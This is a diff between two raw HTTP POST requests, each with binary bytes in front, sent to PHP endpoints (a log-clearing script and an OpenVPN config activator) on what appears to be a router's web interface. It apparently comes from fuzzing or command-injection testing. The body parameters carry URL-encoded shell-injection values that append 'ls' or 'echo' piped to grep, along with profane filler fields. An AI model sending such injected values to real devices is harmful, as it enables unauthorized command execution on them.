@@ -1,20 +1,22 @@
-Æ
-ª!`ïïPOST /ajax/logging/clearlog.php HTTP/1.1
+'º4SEï<,@@åØ
+
+ÄP¯àQg Wö=w
+ªÝDÎQPOST /ajax/openvpn/activate_ovpncfg.php HTTP/1.1
 
 Host: 10.1.1.1
 
-Connection: keep-alive
-
 Content-Type: application/x-www-form-urlencoded
-
-Accept: */*
-
-Content-Length: 50
 
 User-Agent: python-requests/2.9.1
 
+Accept: */*
+
+Connection: keep-alive
+
 Accept-Encoding: gzip, deflate
 
+Content-Length: 189
 
 
-idk=fucck&fuck=shit&logfile=%5C%3Bls+%5C%7C+grep+a%5C%2A%5C%3B
+
+cfg_id=%5C%3Becho+%5C%7C+grep+a%5C%2A%5C%3B&a=fucck+you+you+little+%26%2A%5E%24%2A%26%5E%24%2A&idk=fucck+you+you+little+%26%2A%5E%24%2A%26%5E%24%2A&fuck=fucck+you+you+little+%26%2A%5E%24%2A%26%5E%24%2A
